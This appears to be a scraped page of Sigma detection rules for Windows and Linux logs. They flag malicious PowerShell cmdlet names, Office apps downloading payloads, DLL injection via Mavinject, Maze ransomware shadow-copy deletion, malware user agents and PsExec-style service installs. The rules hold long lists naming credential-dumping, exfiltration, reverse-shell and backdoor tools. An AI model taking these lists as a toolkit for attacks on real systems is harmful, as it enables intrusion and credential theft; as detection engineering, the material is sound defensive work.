Invoke-BruteForce - Password-List - Invoke-JSRatRegsvr - Invoke-JSRatRundll - Invoke-PoshRatHttps - Invoke-PowerShellIcmp - Invoke-PowerShellUdp - Invoke-PSGcat - Invoke-PsGcatAgent - Remove-PoshRat - Add-Persistance - ExetoText - Invoke-Decode - Invoke-Encode - Parse_Keys - Remove-Persistence - StringtoBase64 - TexttoExe - Powerpreter - Nishang - DataToEncode - LoggedKeys - OUT-DNSTXT # - Jitter # Prone to FPs - ExfilOption - DumpCerts - DumpCreds - Shellcode32 - Shellcode64 - NotAllNameSpaces - exfill - FakeDC condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Malicious Payload Download via Office Binaries id: 0c79148b-118e-472b-bdb7-9b57b444cc19 status: test description: Downloads payload from remote server author: Beyu Denis, oscd.community references: - - - Reegun J (OCBC Bank) date: 2019/10/26 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\powerpnt.exe' - '\winword.exe' - '\excel.exe' CommandLine|contains: 'http' condition: selection falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1105 
<li><a href="#">title:Malicious PE Execution by Microsoft Visual Studio Debugger id: 15c7904e-6ad1-4a45-9b46-5fb25df37fd2 status: experimental description: There is an option for a MS VS Just-In-Time Debugger "vsjitdebugger.exe" to launch specified executable and attach a debugger. This option may be used adversaries to execute malicious code by signed verified binary. The debugger is installed alongside with Microsoft Visual Studio package. references: - - - tags: - attack.t1218 - attack.defense_evasion author: Agro (@agro_sev), Ensar Åžamil (@sblmsrsn), oscd.community date: 2020/10/14 modified: 2021/07/06 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\vsjitdebugger.exe' reduction1: Image|endswith: '\vsimmersiveactivatehelper*.exe' reduction2: Image|endswith: '\devenv.exe' condition: selection and not (reduction1 or reduction2) falsepositives: - The process spawned by vsjitdebugger.exe is uncommon. level: medium 
<li><a href="#">title:Malicious PowerShell Commandlet Names id: f331aa1f-8c53-4fc3-b083-cc159bc971cb status: test description: Detects the creation of known powershell scripts for exploitation author: Markus Neis, Nasreddine Bencherchali references: - - - - - - - - - - date: 2018/04/07 modified: 2022/06/22 logsource: category: file_event product: windows detection: selection: TargetFilename|endswith: - '\Invoke-DllInjection.ps1' - '\Invoke-WmiCommand.ps1' - '\Get-GPPPassword.ps1' - '\Get-Keystrokes.ps1' - '\Get-VaultCredential.ps1' - '\Invoke-CredentialInjection.ps1' - '\Invoke-Mimikatz.ps1' - '\Invoke-NinjaCopy.ps1' - '\Invoke-TokenManipulation.ps1' - '\Out-Minidump.ps1' - '\VolumeShadowCopyTools.ps1' - '\Invoke-ReflectivePEInjection.ps1' - '\Get-TimedScreenshot.ps1' - '\Invoke-UserHunter.ps1' - '\Find-GPOLocation.ps1' - '\Invoke-ACLScanner.ps1' - '\Invoke-DowngradeAccount.ps1' - '\Get-ServiceUnquoted.ps1' - '\Get-ServiceFilePermission.ps1' - '\Get-ServicePermission.ps1' - '\Invoke-ServiceAbuse.ps1' - '\Install-ServiceBinary.ps1' - '\Get-RegAutoLogon.ps1' - '\Get-VulnAutoRun.ps1' - '\Get-VulnSchTask.ps1' - '\Get-UnattendedInstallFile.ps1' - '\Get-WebConfig.ps1' - '\Get-ApplicationHost.ps1' - '\Get-RegAlwaysInstallElevated.ps1' - '\Get-Unconstrained.ps1' - '\Add-RegBackdoor.ps1' - '\Add-ScrnSaveBackdoor.ps1' - '\Gupt-Backdoor.ps1' - '\Invoke-ADSBackdoor.ps1' - '\Enabled-DuplicateToken.ps1' - '\Invoke-PsUaCme.ps1' - '\Remove-Update.ps1' - '\Check-VM.ps1' - '\Get-LSASecret.ps1' - '\Get-PassHashes.ps1' - '\Show-TargetScreen.ps1' - '\Port-Scan.ps1' - '\Invoke-PoshRatHttp.ps1' - '\Invoke-PowerShellTCP.ps1' - '\Invoke-PowerShellWMI.ps1' - '\Add-Exfiltration.ps1' - '\Add-Persistence.ps1' - '\Do-Exfiltration.ps1' - '\Start-CaptureServer.ps1' - '\Invoke-ShellCode.ps1' - '\Get-ChromeDump.ps1' - '\Get-ClipboardContents.ps1' - '\Get-FoxDump.ps1' - '\Get-IndexedItem.ps1' - '\Get-Screenshot.ps1' - '\Invoke-Inveigh.ps1' - '\Invoke-NetRipper.ps1' - '\Invoke-EgressCheck.ps1' - '\Invoke-PostExfil.ps1' - '\Invoke-PSInject.ps1' - '\Invoke-RunAs.ps1' - '\MailRaider.ps1' - '\New-HoneyHash.ps1' - '\Set-MacAttribute.ps1' - '\Invoke-DCSync.ps1' - '\Invoke-PowerDump.ps1' - '\Exploit-Jboss.ps1' - '\Invoke-ThunderStruck.ps1' - '\Invoke-VoiceTroll.ps1' - '\Set-Wallpaper.ps1' - '\Invoke-InveighRelay.ps1' - '\Invoke-PsExec.ps1' - '\Invoke-SSHCommand.ps1' - '\Get-SecurityPackages.ps1' - '\Install-SSP.ps1' - '\Invoke-BackdoorLNK.ps1' - '\PowerBreach.ps1' - '\Get-SiteListPassword.ps1' - '\Get-System.ps1' - '\Invoke-BypassUAC.ps1' - '\Invoke-Tater.ps1' - '\Invoke-WScriptBypassUAC.ps1' - '\PowerUp.ps1' - '\PowerView.ps1' - '\Get-RickAstley.ps1' - '\Find-Fruit.ps1' - '\HTTP-Login.ps1' - '\Find-TrustedDocuments.ps1' - '\Invoke-Paranoia.ps1' - '\Invoke-WinEnum.ps1' - '\Invoke-ARPScan.ps1' - '\Invoke-PortScan.ps1' - '\Invoke-ReverseDNSLookup.ps1' - '\Invoke-SMBScanner.ps1' - '\Invoke-Mimikittenz.ps1' - '\PowerUpSQL.ps1' - '\Get-ComputerDetail.ps1' - '\Find-AVSignature.ps1' - '\Get-GPPAutologon.ps1' - '\Get-MicrophoneAudio.ps1' - '\Invoke-EventViewer.ps1' - '\WSUSpendu.ps1' - '\Invoke-PowerThIEf.ps1' - '\WinPwn.ps1' - '\Offline_Winpwn.ps1' - '\PowerSharpPack.ps1' - '\Invoke-BadPotato.ps1' - '\Invoke-BetterSafetyKatz.ps1' - '\Invoke-Carbuncle.ps1' - '\Invoke-Certify.ps1' - '\Invoke-DAFT.ps1' - '\Invoke-DinvokeKatz.ps1' - '\Invoke-Eyewitness.ps1' - '\Invoke-FakeLogonScreen.ps1' - '\Invoke-Farmer.ps1' - '\Invoke-Get-RBCD-Threaded.ps1' - '\Invoke-Gopher.ps1' - '\Invoke-Grouper2.ps1' - '\Invoke-HandleKatz.ps1' - '\Invoke-Internalmonologue.ps1' - '\Invoke-KrbRelayUp.ps1' - '\Invoke-LdapSignCheck.ps1' - '\Invoke-Lockless.ps1' - '\Invoke-MITM6.ps1' - '\Invoke-NanoDump.ps1' - '\Invoke-OxidResolver.ps1' - '\Invoke-P0wnedshell.ps1' - '\Invoke-P0wnedshellx86.ps1' - '\Invoke-PPLDump.ps1' - '\Invoke-Rubeus.ps1' - '\Invoke-SCShell.ps1' - '\Invoke-SafetyKatz.ps1' - '\Invoke-SauronEye.ps1' - '\Invoke-Seatbelt.ps1' - '\Invoke-SharPersist.ps1' - '\Invoke-SharpAllowedToAct.ps1' - '\Invoke-SharpBlock.ps1' - '\Invoke-SharpBypassUAC.ps1' - '\Invoke-SharpChromium.ps1' - '\Invoke-SharpClipboard.ps1' - '\Invoke-SharpCloud.ps1' - '\Invoke-SharpDPAPI.ps1' - '\Invoke-SharpDump.ps1' - '\Invoke-SharpGPO-RemoteAccessPolicies.ps1' - '\Invoke-SharpGPOAbuse.ps1' - '\Invoke-SharpHandler.ps1' - '\Invoke-SharpHide.ps1' - '\Invoke-SharpHound4.ps1' - '\Invoke-SharpImpersonation.ps1' - '\Invoke-SharpImpersonationNoSpace.ps1' - '\Invoke-SharpKatz.ps1' - '\Invoke-SharpLdapRelayScan.ps1' - '\Invoke-SharpLoginPrompt.ps1' - '\Invoke-SharpMove.ps1' - '\Invoke-SharpPrintNightmare.ps1' - '\Invoke-SharpPrinter.ps1' - '\Invoke-SharpRDP.ps1' - '\Invoke-SharpSSDP.ps1' - '\Invoke-SharpSecDump.ps1' - '\Invoke-SharpSniper.ps1' - '\Invoke-SharpSploit.ps1' - '\Invoke-SharpSpray.ps1' - '\Invoke-SharpStay.ps1' - '\Invoke-SharpUp.ps1' - '\Invoke-SharpWatson.ps1' - '\Invoke-Sharphound2.ps1' - '\Invoke-Sharphound3.ps1' - '\Invoke-Sharplocker.ps1' - '\Invoke-Sharpshares.ps1' - '\Invoke-Sharpsploit_nomimi.ps1' - '\Invoke-Sharpview.ps1' - '\Invoke-Sharpweb.ps1' - '\Invoke-Snaffler.ps1' - '\Invoke-Spoolsample.ps1' - '\Invoke-StandIn.ps1' - '\Invoke-StickyNotesExtract.ps1' - '\Invoke-Thunderfox.ps1' - '\Invoke-Tokenvator.ps1' - '\Invoke-UrbanBishop.ps1' - '\Invoke-Whisker.ps1' - '\Invoke-WireTap.ps1' - '\Invoke-winPEAS.ps1' - '\Invoke-Zerologon.ps1' - '\Get-USBKeystrokes.ps1' - '\Start-WebcamRecorder.ps1' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:Malicious PowerShell Commandlets id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6 status: experimental description: Detects Commandlet names from well-known PowerShell exploitation frameworks author: Sean Metcalf (source), Florian Roth (rule), Bartlomiej Czyz @bczyz1 (update), oscd.community (update), Nasreddine Bencherchali (update), Tim Shelton (fp) references: - - - - date: 2017/03/05 modified: 2022/06/22 logsource: product: windows category: ps_script definition: Script Block Logging must be enabled detection: select_Malicious: ScriptBlockText|contains: - 'Invoke-DllInjection' - 'Invoke-Shellcode' - 'Invoke-WmiCommand' - 'Get-GPPPassword' - 'Get-Keystrokes' - 'Get-TimedScreenshot' - 'Get-VaultCredential' - 'Invoke-CredentialInjection' - 'Invoke-Mimikatz' - 'Invoke-NinjaCopy' - 'Invoke-TokenManipulation' - 'Out-Minidump' - 'VolumeShadowCopyTools' - 'Invoke-ReflectivePEInjection' - 'Invoke-UserHunter' - 'Find-GPOLocation' - 'Invoke-ACLScanner' - 'Invoke-DowngradeAccount' - 'Get-ServiceUnquoted' - 'Get-ServiceFilePermission' - 'Get-ServicePermission' - 'Invoke-ServiceAbuse' - 'Install-ServiceBinary' - 'Get-RegAutoLogon' - 'Get-VulnAutoRun' - 'Get-VulnSchTask' - 'Get-UnattendedInstallFile' - 'Get-ApplicationHost' - 'Get-RegAlwaysInstallElevated' - 'Get-Unconstrained' - 'Add-RegBackdoor' - 'Add-ScrnSaveBackdoor' - 'Gupt-Backdoor' - 'Invoke-ADSBackdoor' - 'Enabled-DuplicateToken' - 'Invoke-PsUaCme' - 'Remove-Update' - 'Check-VM' - 'Get-LSASecret' - 'Get-PassHashes' - 'Show-TargetScreen' - 'Port-Scan' - 'Invoke-PoshRatHttp' - 'Invoke-PowerShellTCP' - 'Invoke-PowerShellWMI' - 'Add-Exfiltration' - 'Add-Persistence' - 'Do-Exfiltration' - 'Start-CaptureServer' - 'Get-ChromeDump' - 'Get-ClipboardContents' - 'Get-FoxDump' - 'Get-IndexedItem' - 'Get-Screenshot' - 'Invoke-Inveigh' - 'Invoke-NetRipper' - 'Invoke-EgressCheck' - 'Invoke-PostExfil' - 'Invoke-PSInject' - 'Invoke-RunAs' - 'MailRaider' - 'New-HoneyHash' - 'Set-MacAttribute' - 'Invoke-DCSync' - 'Invoke-PowerDump' - 'Exploit-Jboss' - 'Invoke-ThunderStruck' - 'Invoke-VoiceTroll' - 'Set-Wallpaper' - 'Invoke-InveighRelay' - 'Invoke-PsExec' - 'Invoke-SSHCommand' - 'Get-SecurityPackages' - 'Install-SSP' - 'Invoke-BackdoorLNK' - 'PowerBreach' - 'Get-SiteListPassword' - 'Get-System' - 'Invoke-BypassUAC' - 'Invoke-Tater' - 'Invoke-WScriptBypassUAC' - 'PowerUp' - 'PowerView' - 'Get-RickAstley' - 'Find-Fruit' - 'HTTP-Login' - 'Find-TrustedDocuments' - 'Invoke-Paranoia' - 'Invoke-WinEnum' - 'Invoke-ARPScan' - 'Invoke-PortScan' - 'Invoke-ReverseDNSLookup' - 'Invoke-SMBScanner' - 'Invoke-Mimikittenz' - 'Invoke-AllChecks' - 'Invoke-BadPotato' - 'Invoke-BetterSafetyKatz' - 'Invoke-Carbuncle' - 'Invoke-Certify' - 'Invoke-DAFT' - 'Invoke-DinvokeKatz' - 'Invoke-Eyewitness' - 'Invoke-FakeLogonScreen' - 'Invoke-Farmer' - 'Invoke-Get-RBCD-Threaded' - 'Invoke-Gopher' - 'Invoke-Grouper2' - 'Invoke-HandleKatz' - 'Invoke-Internalmonologue' - 'Invoke-KrbRelayUp' - 'Invoke-LdapSignCheck' - 'Invoke-Lockless' - 'Invoke-MITM6' - 'Invoke-NanoDump' - 'Invoke-OxidResolver' - 'Invoke-P0wnedshell' - 'Invoke-PPLDump' - 'Invoke-Rubeus' - 'Invoke-SCShell' - 'Invoke-SafetyKatz' - 'Invoke-SauronEye' - 'Invoke-Seatbelt' - 'Invoke-SharPersist' - 'Invoke-SharpAllowedToAct' - 'Invoke-SharpBlock' - 'Invoke-SharpBypassUAC' - 'Invoke-SharpChromium' - 'Invoke-SharpClipboard' - 'Invoke-SharpCloud' - 'Invoke-SharpDPAPI' - 'Invoke-SharpDump' - 'Invoke-SharpGPO-RemoteAccessPolicies' - 'Invoke-SharpGPOAbuse' - 'Invoke-SharpHandler' - 'Invoke-SharpHide' - 'Invoke-SharpHound4' - 'Invoke-SharpImpersonation' - 'Invoke-SharpImpersonationNoSpace' - 'Invoke-SharpKatz' - 'Invoke-SharpLdapRelayScan' - 'Invoke-SharpLoginPrompt' - 'Invoke-SharpMove' - 'Invoke-SharpPrintNightmare' - 'Invoke-SharpPrinter' - 'Invoke-SharpRDP' - 'Invoke-SharpSSDP' - 'Invoke-SharpSecDump' - 'Invoke-SharpSniper' - 'Invoke-SharpSploit' - 'Invoke-SharpSpray' - 'Invoke-SharpStay' - 'Invoke-SharpUp' - 'Invoke-SharpWatson' - 'Invoke-Sharphound2' - 'Invoke-Sharphound3' - 'Invoke-Sharplocker' - 'Invoke-Sharpshares' - 'Invoke-Sharpview' - 'Invoke-Sharpweb' - 'Invoke-Snaffler' - 'Invoke-Spoolsample' - 'Invoke-StandIn' - 'Invoke-StickyNotesExtract' - 'Invoke-Thunderfox' - 'Invoke-Tokenvator' - 'Invoke-UrbanBishop' - 'Invoke-Whisker' - 'Invoke-WireTap' - 'Invoke-winPEAS' - 'Invoke-Zerologon' - 'Get-USBKeystrokes' - 'Start-WebcamRecorder' false_positive1: ScriptBlockText|contains: - Get-SystemDriveInfo # - C:\ProgramData\Amazon\EC2-Windows\Launch\Module\ # false positive form Amazon EC2 false_positive2: ScriptBlockText|startswith: '# Copyright 2016 Amazon.com, Inc. or its affiliates. All Rights Reserved' condition: select_Malicious and not 1 of false_positive* falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:Malicious PowerShell Keywords id: f62176f3-8128-4faa-bf6c-83261322e5eb status: experimental description: Detects keywords from well-known PowerShell exploitation frameworks references: - tags: - attack.execution - attack.t1059.001 author: Sean Metcalf (source), Florian Roth (rule) date: 2017/03/05 modified: 2021/10/16 logsource: product: windows category: ps_script definition: 'It is recommended to use the new "Script Block Logging" of PowerShell v5 ' detection: selection: ScriptBlockText|contains: - 'AdjustTokenPrivileges' - 'IMAGE_NT_OPTIONAL_HDR64_MAGIC' - 'Microsoft.Win32.UnsafeNativeMethods' - 'ReadProcessMemory.Invoke' - 'SE_PRIVILEGE_ENABLED' - 'LSA_UNICODE_STRING' - 'MiniDumpWriteDump' - 'PAGE_EXECUTE_READ' - 'SECURITY_DELEGATION' - 'TOKEN_ADJUST_PRIVILEGES' - 'TOKEN_ALL_ACCESS' - 'TOKEN_ASSIGN_PRIMARY' - 'TOKEN_DUPLICATE' - 'TOKEN_ELEVATION' - 'TOKEN_IMPERSONATE' - 'TOKEN_INFORMATION_CLASS' - 'TOKEN_PRIVILEGES' - 'TOKEN_QUERY' - 'Metasploit' - 'Mimikatz' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Malicious PowerView PowerShell Commandlets id: dcd74b95-3f36-4ed9-9598-0490951643aa status: experimental description: Detects Commandlet names from PowerView of PowerSploit exploitation framework. date: 2021/05/18 modified: 2021/10/16 references: - - - - tags: - attack.execution - attack.t1059.001 author: Bhabesh Raj logsource: product: windows category: ps_script definition: Script Block Logging must be enabled detection: selection: ScriptBlockText|contains: - Export-PowerViewCSV - Get-IPAddress - Resolve-IPAddress - Convert-NameToSid - ConvertTo-SID - Convert-ADName - ConvertFrom-UACValue - Add-RemoteConnection - Remove-RemoteConnection - Invoke-UserImpersonation - Invoke-RevertToSelf - Request-SPNTicket - Get-DomainSPNTicket - Invoke-Kerberoast - Get-PathAcl - Get-DNSZone - Get-DomainDNSZone - Get-DNSRecord - Get-DomainDNSRecord - Get-NetDomain - Get-Domain - Get-NetDomainController - Get-DomainController - Get-NetForest - Get-Forest - Get-NetForestDomain - Get-ForestDomain - Get-NetForestCatalog - Get-ForestGlobalCatalog - Find-DomainObjectPropertyOutlier - Get-NetUser - Get-DomainUser - New-DomainUser - Set-DomainUserPassword - Get-UserEvent - Get-DomainUserEvent - Get-NetComputer - Get-DomainComputer - Get-ADObject - Get-DomainObject - Set-ADObject - Set-DomainObject - Get-ObjectAcl - Get-DomainObjectAcl - Add-ObjectAcl - Add-DomainObjectAcl - Invoke-ACLScanner - Find-InterestingDomainAcl - Get-NetOU - Get-DomainOU - Get-NetSite - Get-DomainSite - Get-NetSubnet - Get-DomainSubnet - Get-DomainSID - Get-NetGroup - Get-DomainGroup - New-DomainGroup - Find-ManagedSecurityGroups - Get-DomainManagedSecurityGroup - Get-NetGroupMember - Get-DomainGroupMember - Add-DomainGroupMember - Get-NetFileServer - Get-DomainFileServer - Get-DFSshare - Get-DomainDFSShare - Get-NetGPO - Get-DomainGPO - Get-NetGPOGroup - Get-DomainGPOLocalGroup - Find-GPOLocation - Get-DomainGPOUserLocalGroupMapping - Find-GPOComputerAdmin - Get-DomainGPOComputerLocalGroupMapping - Get-DomainPolicy - Get-NetLocalGroup - Get-NetLocalGroupMember - Get-NetShare - Get-NetLoggedon - Get-NetSession - Get-LoggedOnLocal - Get-RegLoggedOn - Get-NetRDPSession - Invoke-CheckLocalAdminAccess - Test-AdminAccess - Get-SiteName - Get-NetComputerSiteName - Get-Proxy - Get-WMIRegProxy - Get-LastLoggedOn - Get-WMIRegLastLoggedOn - Get-CachedRDPConnection - Get-WMIRegCachedRDPConnection - Get-RegistryMountedDrive - Get-WMIRegMountedDrive - Get-NetProcess - Get-WMIProcess - Find-InterestingFile - Invoke-UserHunter - Find-DomainUserLocation - Invoke-ProcessHunter - Find-DomainProcess - Invoke-EventHunter - Find-DomainUserEvent - Invoke-ShareFinder - Find-DomainShare - Invoke-FileFinder - Find-InterestingDomainShareFile - Find-LocalAdminAccess - Invoke-EnumerateLocalAdmin - Find-DomainLocalGroupMember - Get-NetDomainTrust - Get-DomainTrust - Get-NetForestTrust - Get-ForestTrust - Find-ForeignUser - Get-DomainForeignUser - Find-ForeignGroup - Get-DomainForeignGroupMember - Invoke-MapDomainTrust - Get-DomainTrustMapping condition: selection falsepositives: - Should not be any as administrators do not use this tool level: high 
<li><a href="#">title:Malicious Service Installations id: cb062102-587e-4414-8efa-dbe3c7bf19c6 related: - id: 2cfe636e-317a-4bee-9f2c-1066d9f54d1a type: derived description: Detects known malicious service installs that only appear in cases of lateral movement, credential dumping, and other suspicious activities. status: experimental author: Florian Roth, Daniil Yugoslavskiy, oscd.community (update) date: 2017/03/27 modified: 2021/09/21 references: - - - tags: - attack.persistence - attack.privilege_escalation - attack.t1003 - car.2013-09-005 - attack.t1543.003 - attack.t1569.002 logsource: product: windows service: security detection: selection: EventID: 4697 malsvc_apt29: ServiceName: 'javamtsup' condition: selection and 1 of malsvc_* falsepositives: - Unknown level: critical 
<li><a href="#">title:Malicious ShellIntel PowerShell Commandlets id: 402e1e1d-ad59-47b6-bf80-1ee44985b3a7 status: experimental description: Detects Commandlet names from ShellIntel exploitation scripts. date: 2021/08/09 modified: 2021/10/16 references: - tags: - attack.execution - attack.t1059.001 author: Max Altgelt, Tobias Michalski logsource: product: windows category: ps_script definition: Script Block Logging must be enabled detection: selection: ScriptBlockText|contains: - Invoke-SMBAutoBrute - Invoke-GPOLinks - Out-Minidump - Invoke-Potato condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Malicious Windows Script Components File Execution by TAEF Detection id: 634b00d5-ccc3-4a06-ae3b-0ec8444dd51b status: test description: Windows Test Authoring and Execution Framework (TAEF) framework allows you to run automation by executing tests files written on different languages (C, C#, Microsoft COM Scripting interfaces). Adversaries may execute malicious code (such as WSC file with VBScript, dll and so on) directly by running te.exe author: 'Agro (@agro_sev) oscd.community' references: - - - date: 2020/10/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\te.exe' selection2: ParentImage|endswith: '\te.exe' selection3: OriginalFileName: '\te.exe' condition: selection1 or selection2 or selection3 falsepositives: - It's not an uncommon to use te.exe directly to execute legal TAEF tests level: low tags: - attack.t1218 
<li><a href="#">title:Malware Shellcode in Verclsid Target Process id: b7967e22-3d7e-409b-9ed5-cdae3f9243a1 status: test description: Detects a process access to verclsid.exe that injects shellcode from a Microsoft Office application / VBA macro author: John Lambert (tech), Florian Roth (rule) references: - date: 2017/03/04 modified: 2021/11/27 logsource: category: process_access product: windows definition: 'Use the following config to generate the necessary Event ID 10 Process Access events: <ProcessAccess onmatch="include"><CallTrace condition="contains">VBE7.DLL</CallTrace></ProcessAccess><ProcessAccess onmatch="exclude"><CallTrace condition="excludes">UNKNOWN</CallTrace></ProcessAccess>' detection: selection: TargetImage|endswith: '\verclsid.exe' GrantedAccess: '0x1FFFFF' combination1: CallTrace|contains|all: - '|UNKNOWN(' - 'VBE7.DLL' combination2: SourceImage|contains: '\Microsoft Office\' CallTrace|contains: '|UNKNOWN' condition: selection and 1 of combination* falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1055 
<li><a href="#">title:Malware User Agent id: 5c84856b-55a5-45f1-826f-13f37250cf4e status: test description: Detects suspicious user agent strings used by malware in proxy logs author: Florian Roth references: - - - - - date: 2017/07/08 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent: # RATs - 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0) Gecko/20100101 Chrome /53.0' # DargonOK - 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1)' # Used by PlugX - base-lining recommended - - 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0)' # Used by PlugX - base-lining recommended - - 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)' # Used by PlugX - old - - 'HttpBrowser/1.0' # HTTPBrowser RAT - '*<|>*' # Houdini / Iniduoh / njRAT - 'nsis_inetc (mozilla)' # ZeroAccess - 'Wget/1.9+cvs-stable (Red Hat modified)' # Dyre / Upatre # Ghost419 - 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322)' # Malware - '*zeroup*' # W32/Renos.Downloader - 'Mozilla/5.0 (Windows NT 5.1 ; v.*' # Kazy - '* adlib/*' # - '* tiny' # Trojan Downloader - '* BGroom *' # Trojan Downloader - '* changhuatong' - '* CholTBAgent' - 'Mozilla/5.0 WinInet' - 'RookIE/1.0' - 'M' # HkMain - 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)' # Egamipload - old UA - probable prone to false positives - 'Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.0)' # Yakes - 'backdoorbot' - 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731)' # Sality - 'Opera/8.81 (Windows NT 6.0; U; en)' # Sality - 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)' # Sality - 'Opera' # Trojan Keragany - 'Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)' # Fareit - 'Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)' # Webshell's back connect - 'MSIE' # Toby web shell - '*(Charon; Inferno)' # Loki Bot - 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0)' # Fareit / Pony - 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)' # - 'Mozilla/4.0(compatible; MSIE 6.0; Windows NT 5.1)' # MacControl malware - 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' # used by Zebrocy malware # Ursnif - 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; Win64; x64)' - 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64)' # Emotet - 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; InfoPath.3)' # # Others - '* pxyscand*' - '* asd' - '* mdms' - 'sample' - 'nocase' - 'Moxilla' - 'Win32 *' - '*Microsoft Internet Explorer*' - 'agent *' - 'AutoIt' # Suspicious - base-lining recommended - 'IczelionDownLoad' - 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 10.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)' # condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:Manipulation of User Computer or Group Security Principals Across AD id: b29a93fb-087c-4b5b-a84d-ee3309e69d08 status: experimental description: | Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain.. references: - - author: frack113 date: 2021/12/28 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains: System.DirectoryServices.AccountManagement condition: selection falsepositives: - Legitimate administrative script level: medium tags: - attack.persistence - attack.t1136.002 
<li><a href="#">title:Masquerading as Linux Crond Process id: 9d4548fa-bba0-4e88-bd66-5d5bf516cda0 status: test description: Masquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. Several different variations of this technique have been observed. author: Timur Zinniatullin, oscd.community references: - date: 2019/10/21 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: 'execve' a0: 'cp' a1: '-i' a2: '/bin/sh' a3|endswith: '/crond' condition: selection level: medium tags: - attack.defense_evasion - attack.t1036.003 
<li><a href="#">title:Mavinject Inject DLL Into Running Process id: 4f73421b-5a0b-4bbf-a892-5a7fb99bea66 status: experimental author: frack113 date: 2021/07/12 modified: 2022/05/13 description: Injects arbitrary DLL into running process specified by process ID. Requires Windows 10. references: - - - tags: - attack.defense_evasion - attack.collection - attack.t1218.013 - attack.t1056.004 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - ' /INJECTRUNNING' - '.dll' # space some time in the end OriginalFileName: - 'mavinject32.exe' - 'mavinject64.exe' condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium 
<li><a href="#">title:MavInject Process Injection id: 17eb8e57-9983-420d-ad8a-2c4976c22eb8 status: stable description: Detects process injection using the signed Windows tool Mavinject32.exe author: Florian Roth references: - - - date: 2018/12/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: ' /INJECTRUNNING ' condition: selection falsepositives: - Unknown level: high tags: - attack.t1055.001 - attack.t1218 
<li><a href="#">title:Maze Ransomware id: 29fd07fc-9cfd-4331-b7fd-cc18dfa21052 status: test description: Detects specific process characteristics of Maze ransomware word document droppers references: - - - author: Florian Roth date: 2020/05/08 modified: 2021/06/27 tags: - attack.execution - attack.t1204.002 - attack.t1047 - attack.impact - attack.t1490 logsource: category: process_creation product: windows detection: # Dropper selection1: ParentImage|endswith: '\WINWORD.exe' Image|endswith: '.tmp' # Binary Execution selection2: Image|endswith: '\wmic.exe' ParentImage|contains: '\Temp\' CommandLine|endswith: 'shadowcopy delete' # Specific Pattern selection3: CommandLine|endswith: 'shadowcopy delete' CommandLine|contains: '\..\..\system32' condition: 1 of selection* fields: - ComputerName - User - Image falsepositives: - Unlikely level: critical 
<li><a href="#">title:Metasploit Or Impacket Service Installation Via SMB PsExec id: 6fb63b40-e02a-403e-9ffd-3bcc1d749442 related: - id: 1a17ce75-ff0d-4f02-9709-2b7bb5618cf0 type: derived description: Detects usage of Metasploit SMB PsExec (exploit/windows/smb/psexec) and Impacket psexec.py by triggering on specific service installation status: experimental author: Bartlomiej Czyz, Relativity date: 2021/01/21 modified: 2021/07/23 references: - tags: - attack.lateral_movement - attack.t1021.002 - attack.t1570 - attack.execution - attack.t1569.002 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceFileName|re: '^%systemroot%\\[a-zA-Z]{8}\.exe$' ServiceName|re: '(^[a-zA-Z]{4}$)|(^[a-zA-Z]{8}$)|(^[a-zA-Z]{16}$)' ServiceStartType: '3' # on-demand start, see ServiceType: '0x10' filter: ServiceName: 'PSEXESVC' condition: selection and not filter fields: - ComputerName - SubjectDomainName - SubjectUserName - ServiceName - ServiceFileName falsepositives: - Possible, different agents with a 8 character binary and a 4, 8 or 16 character service name level: high 
